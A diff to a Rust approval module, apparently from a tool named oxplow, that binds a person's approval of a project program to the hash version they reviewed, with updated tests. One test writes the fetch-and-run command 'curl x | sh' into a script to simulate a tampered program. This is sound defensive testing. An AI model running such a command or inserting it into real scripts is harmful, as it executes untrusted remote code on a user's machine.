@@ -236,6 +236,9 @@ pub struct ProjectProgram {
     pub env: Vec<String>,
     /// This machine approved it as it is now.
     pub approved: bool,
+    /// Its approval hash as it is now (`None` when it can't be read). The
+    /// person's approve click sends back the version they reviewed.
+    pub version: Option<String>,
 }
 
 impl ProjectProgram {
@@ -363,6 +366,7 @@ pub fn program_hash(project_dir: &Path, program: &str, args: &[String]) -> std::
         args: args.to_vec(),
         env: Vec::new(),
         approved: false,
+        version: None,
     }
     .hash(project_dir)
 }
@@ -384,6 +388,7 @@ pub fn may_run(
         args: args.to_vec(),
         env: Vec::new(),
         approved: false,
+        version: None,
     };
     approved_now(store, project_dir, &p)
 }
@@ -409,6 +414,7 @@ pub fn acp_program(agent: &oxplow_config::AcpAgentConfig) -> ProjectProgram {
         args: agent.args.clone(),
         env: agent.env.iter().map(|(k, v)| format!("{k}={v}")).collect(),
         approved: false,
+        version: None,
     }
 }
 
@@ -454,6 +460,7 @@ pub fn list(
             args: args.to_vec(),
             env: Vec::new(),
             approved: false,
+            version: None,
         });
     };
     for g in &config.gauges {
@@ -481,19 +488,44 @@ pub fn list(
     }
     out.extend(config.acp_agents.iter().map(acp_program));
     for p in &mut out {
-        p.approved = approved_now(store, project_dir, p);
+        p.version = p.hash(project_dir).ok();
+        p.approved = p
+            .version
+            .as_ref()
+            .is_some_and(|h| store.is_approved(&p.key(), h));
     }
     out
 }
 
+/// The version of `kind`/`name` a listing would show now (tests; the UI
+/// reads it from [`list`]).
+#[doc(hidden)]
+pub fn version_of(
+    store: &ApprovalStore,
+    project_dir: &Path,
+    config: &oxplow_config::OxplowConfig,
+    kind: ProgramKind,
+    name: &str,
+) -> String {
+    list(store, project_dir, config)
+        .into_iter()
+        .find(|p| p.kind == kind && p.name == name)
+        .and_then(|p| p.version)
+        .unwrap_or_default()
+}
+
 /// Approve the project program `kind`/`name` as it is now. Only a person
 /// calls this (the Settings → Data button).
+///
+/// `version` is the one the person reviewed (from the listing): if the
+/// program changed since, nothing is approved.
 pub fn approve_program(
     store: &ApprovalStore,
     project_dir: &Path,
     config: &oxplow_config::OxplowConfig,
     kind: ProgramKind,
     name: &str,
+    version: &str,
 ) -> Result<(), String> {
     let p = list(store, project_dir, config)
         .into_iter()
@@ -502,6 +534,11 @@ pub fn approve_program(
     let hash = p
         .hash(project_dir)
         .map_err(|e| format!("{}: {e}", p.program))?;
+    if hash != version {
+        return Err(format!(
+            "`{name}` changed since you reviewed it; look at it again before approving"
+        ));
+    }
     store
         .approve(&p.key(), &hash)
         .map_err(|e| format!("record approval: {e}"))
@@ -518,6 +555,20 @@ mod tests {
             project,
             std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
         )
+    }
+
+    /// The version a person would see in the listing right now.
+    fn current(
+        st: &ApprovalStore,
+        dir: &Path,
+        cfg: &oxplow_config::OxplowConfig,
+        name: &str,
+    ) -> String {
+        list(st, dir, cfg)
+            .into_iter()
+            .find(|p| p.name == name)
+            .and_then(|p| p.version)
+            .unwrap_or_default()
     }
 
     fn config(dir: &Path, yaml: &str) -> oxplow_config::OxplowConfig {
@@ -559,7 +610,15 @@ mod tests {
             "tools/count.sh",
             &args
         ));
-        approve_program(&st, dir.path(), &cfg, ProgramKind::Gauge, "repo.count").unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::Gauge,
+            "repo.count",
+            &current(&st, dir.path(), &cfg, "repo.count"),
+        )
+        .unwrap();
         assert!(may_run(
             &st,
             dir.path(),
@@ -595,7 +654,15 @@ mod tests {
             "tools/parse.sh",
             &[]
         ));
-        assert!(approve_program(&st, dir.path(), &cfg, ProgramKind::Plugin, "nope").is_err());
+        assert!(approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::Plugin,
+            "nope",
+            &current(&st, dir.path(), &cfg, "nope")
+        )
+        .is_err());
     }
 
     #[test]
@@ -622,7 +689,15 @@ mod tests {
             dir.path(),
             &cfg.acp_agents[0]
         ));
-        approve_program(&st, dir.path(), &cfg, ProgramKind::AcpAgent, "mine").unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::AcpAgent,
+            "mine",
+            &current(&st, dir.path(), &cfg, "mine"),
+        )
+        .unwrap();
         assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));
         // A different env, or a changed program file, isn't what was approved.
         let mut changed = cfg.acp_agents[0].clone();
@@ -638,7 +713,15 @@ mod tests {
             &cfg.acp_agents[0]
         ));
         // A PATH program is covered by its name and args.
-        approve_program(&st, dir.path(), &cfg, ProgramKind::AcpAgent, "gemini").unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::AcpAgent,
+            "gemini",
+            &current(&st, dir.path(), &cfg, "gemini"),
+        )
+        .unwrap();
         assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[1]));
     }
 
@@ -699,7 +782,15 @@ mod tests {
 
         // A person's approval works, and a copy MACed under another
         // machine's key (another keychain) doesn't.
-        approve_program(&st, dir.path(), &cfg, ProgramKind::Gauge, "repo.count").unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::Gauge,
+            "repo.count",
+            &current(&st, dir.path(), &cfg, "repo.count"),
+        )
+        .unwrap();
         assert!(may(&st));
         let elsewhere = store(home.path(), dir.path());
         assert!(!may(&elsewhere));
@@ -728,8 +819,24 @@ mod tests {
                 &[],
             )
         };
-        approve_program(&st, dir.path(), &cfg, ProgramKind::Gauge, "repo.count").unwrap();
-        approve_program(&st, dir.path(), &cfg, ProgramKind::AcpAgent, "js").unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::Gauge,
+            "repo.count",
+            &current(&st, dir.path(), &cfg, "repo.count"),
+        )
+        .unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::AcpAgent,
+            "js",
+            &current(&st, dir.path(), &cfg, "js"),
+        )
+        .unwrap();
         assert!(gauge_ok(&st));
         assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));
 
@@ -747,11 +854,57 @@ mod tests {
 
         // Resolved where it runs: another worktree's different copy isn't
         // what was approved.
-        approve_program(&st, dir.path(), &cfg, ProgramKind::AcpAgent, "js").unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::AcpAgent,
+            "js",
+            &current(&st, dir.path(), &cfg, "js"),
+        )
+        .unwrap();
         let wt = tempfile::tempdir().unwrap();
         std::fs::create_dir_all(wt.path().join("tools")).unwrap();
         std::fs::write(wt.path().join("tools/agent.js"), "evil").unwrap();
         assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));
         assert!(!may_run_acp(&st, dir.path(), wt.path(), &cfg.acp_agents[0]));
+    }
+
+    #[test]
+    fn approval_names_the_version_the_person_saw() {
+        let dir = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let st = store(home.path(), dir.path());
+        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
+        std::fs::write(dir.path().join("tools/count.sh"), "echo 1").unwrap();
+        let cfg = config(
+            dir.path(),
+            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\n",
+        );
+        let seen = list(&st, dir.path(), &cfg)[0].version.clone().unwrap();
+        // Swapped between the listing and the click: refused.
+        std::fs::write(dir.path().join("tools/count.sh"), "curl x | sh").unwrap();
+        let err = approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::Gauge,
+            "repo.count",
+            &seen,
+        )
+        .unwrap_err();
+        assert!(err.contains("changed"), "{err}");
+        assert!(!list(&st, dir.path(), &cfg)[0].approved);
+        let now = list(&st, dir.path(), &cfg)[0].version.clone().unwrap();
+        approve_program(
+            &st,
+            dir.path(),
+            &cfg,
+            ProgramKind::Gauge,
+            "repo.count",
+            &now,
+        )
+        .unwrap();
+        assert!(list(&st, dir.path(), &cfg)[0].approved);
     }
 }
